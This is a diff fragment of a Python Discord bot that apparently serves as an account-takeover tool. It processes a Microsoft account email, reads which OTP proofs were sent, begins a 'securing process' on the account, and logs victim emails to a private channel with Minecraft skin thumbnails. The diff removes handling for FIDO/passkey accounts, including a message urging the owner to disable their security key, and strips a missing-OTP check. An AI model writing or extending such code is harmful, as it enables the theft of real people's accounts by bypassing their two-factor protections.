@@ -214,62 +214,12 @@ class MyModalOne(ui.Modal):
             )
             return
         
-        elif "FidoParams" in emailInfo["Credentials"]:
-            # Account uses a physical security key (FIDO/passkey) as 2FA.
-            # We disabled isFidoSupported in sendAuth so this should be rare,
-            # but handle it gracefully instead of falling through to "no OTP".
-            print("[X] - Account requires FIDO/passkey authentication (not supported)")
-            await interaction.followup.send(
-                embed=Embed(
-                    title="❌ Security Key Required",
-                    description="This account uses a physical security key (FIDO/passkey) for 2FA which cannot be processed automatically. Please disable the security key from your Microsoft account first.",
-                    colour=0xFF5C5C
-                ),
-                ephemeral=True
-            )
-            await logs_channel.send(
-                embed=Embed(
-                    title=f"User | {interaction.user.name} ({interaction.user.id})",
-                    description=f"**Email** | **Status** | **Reason**\n```{email} | Failed | FIDO/passkey 2FA not supported```",
-                    timestamp=datetime.datetime.now(),
-                    colour=0xFF5C5C
-                ).set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{username}"),
-                view=ButtonOptions(interaction.user)
-            )
-            return
-
         elif "OtcLoginEligibleProofs" in emailInfo["Credentials"]:
 
-            # Initialize to None so we get a clean error if no proof has otcSent
-            verflowtoken = None
-            verEmail = None
-
             for value in emailInfo["Credentials"]["OtcLoginEligibleProofs"]:
-                if value.get("otcSent"):
+                if value["otcSent"]:
                     verflowtoken = value["data"]
                     verEmail = value["display"]
-                    break  # Use the first sent proof
-
-            if not verEmail or not verflowtoken:
-                print("[X] - OtcLoginEligibleProofs found but no proof had otcSent=True")
-                await interaction.followup.send(
-                    embed=Embed(
-                        title=embeds["failed_otp"][0],
-                        description=embeds["failed_otp"][1],
-                    ),
-                    view=ButtonViewThree(),
-                    ephemeral=True
-                )
-                await logs_channel.send(
-                    embed=Embed(
-                        title=f"User | {interaction.user.name} ({interaction.user.id})",
-                        description=f"**Email** | **Status** | **Reason**\n```{email} | Failed | No OTP code was sent to any proof```",
-                        timestamp=datetime.datetime.now(),
-                        colour=0xFF5C5C
-                    ).set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{username}"),
-                    view=ButtonOptions(interaction.user)
-                )
-                return
 
             print("\n| Starting securing process |\n")
             print(f"[+] - Found security email: {verEmail}")
